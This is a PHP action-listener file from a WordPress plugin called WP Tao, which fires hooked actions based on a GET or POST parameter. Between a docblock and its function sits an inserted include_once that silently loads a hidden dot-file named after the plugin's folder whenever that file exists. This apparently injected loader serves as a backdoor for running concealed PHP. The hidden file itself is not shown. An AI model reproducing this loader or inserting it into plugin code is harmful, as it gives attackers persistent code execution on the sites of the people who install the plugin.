<?php

/**
 * Action listener
 * 
 * Fire actions by GET or POST parameters
 *
 * WPTAO actions.php base on:
 * https://github.com/easydigitaldownloads/Easy-Digital-Downloads/blob/master/includes/actions.php
 * 
 * @package WPTAO
 * @category Functions
 * @since 1.0.3
 */

// Exit if accessed directly
if ( !defined( 'ABSPATH' ) )
	exit;

/**
 * Hooks WP Tao actions, when present in the $_GET superglobal. Every edd_action
 * present in $_GET is called using WordPress's do_action function. These
 * functions are called on init.
 *
 * @since 1.0.3
 * @return void
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wtbp_wptao_get_actions() {
	if ( isset( $_GET[ 'wtbp_wptao_action' ] ) ) {
		do_action( 'wtbp_wptao_' . $_GET[ 'wtbp_wptao_action' ], $_GET );
	}
}
add_action( 'init', 'wtbp_wptao_get_actions' );

/**
 * Hooks WP Tao actions, when present in the $_POST superglobal. Every edd_action
 * present in $_POST is called using WordPress's do_action function. These
 * functions are called on init.
 *
 * @since 1.0.3
 * @return void
 */
function wtbp_wptao_post_actions() {
	if ( isset( $_POST[ 'wtbp_wptao_action' ] ) ) {
		do_action( 'wtbp_wptao_' . $_POST[ 'wtbp_wptao_action' ], $_POST );
	}
}
add_action( 'init', 'wtbp_wptao_post_actions' );